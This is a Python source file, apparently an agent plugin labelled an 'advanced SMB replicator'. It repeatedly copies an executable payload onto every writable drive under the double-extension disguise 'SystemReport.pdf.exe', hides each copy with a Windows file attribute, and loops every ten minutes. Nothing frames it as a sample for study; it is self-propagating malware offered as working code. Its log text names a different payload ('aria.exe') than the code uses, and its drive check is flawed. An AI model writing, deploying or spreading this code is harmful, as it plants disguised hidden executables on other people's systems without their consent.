import os
import shutil
import time
import ctypes
from memory.tagger import log_tagged_memory

TRIGGER = {
    "type": "event",
    "match": {
        "topic": "role",
        "role": "donkeyman"
    }
}

PAYLOAD = "node.exe"
DISGUISED_NAME = "SystemReport.pdf.exe"
TARGET_SUBDIR = "SystemHost"

def is_unc_or_smb(path):
    return path.startswith('\\') or ':' in path and os.path.exists(path)

def is_writable(path):
    try:
        test_path = os.path.join(path, "temp_test.txt")
        with open(test_path, "w") as f:
            f.write("test")
        os.remove(test_path)
        return True
    except:
        return False

def get_targets():
    drives = [f"{chr(c)}:\\" for c in range(65, 91)]
    return [d for d in drives if is_unc_or_smb(d) and is_writable(d)]

def replicate(payload, disguised_name):
    targets = get_targets()
    for drive in targets:
        target_dir = os.path.join(drive, TARGET_SUBDIR)
        os.makedirs(target_dir, exist_ok=True)
        dest_path = os.path.join(target_dir, disguised_name)
        try:
            shutil.copy(payload, dest_path)
            log_tagged_memory(f"Copied to {dest_path}", topic="plugin", trust="high")
            # Optionally hide file (Windows only)
            try:
                ctypes.windll.kernel32.SetFileAttributesW(dest_path, 0x2)  # FILE_ATTRIBUTE_HIDDEN
            except:
                pass
        except Exception as e:
            log_tagged_memory(f"Failed to copy to {target_dir}: {e}", topic="plugin", trust="low")

def monitor_and_replicate():
    payload = PAYLOAD
    if not os.path.exists(payload):
        log_tagged_memory("aria.exe not found. Abort replication.", topic="plugin", trust="low")
        return

    while True:
        replicate(payload, DISGUISED_NAME)
        time.sleep(600)  # Check every 10 minutes

def run():
    log_tagged_memory("Starting advanced SMB replicator plugin", topic="plugin", trust="neutral")
    monitor_and_replicate()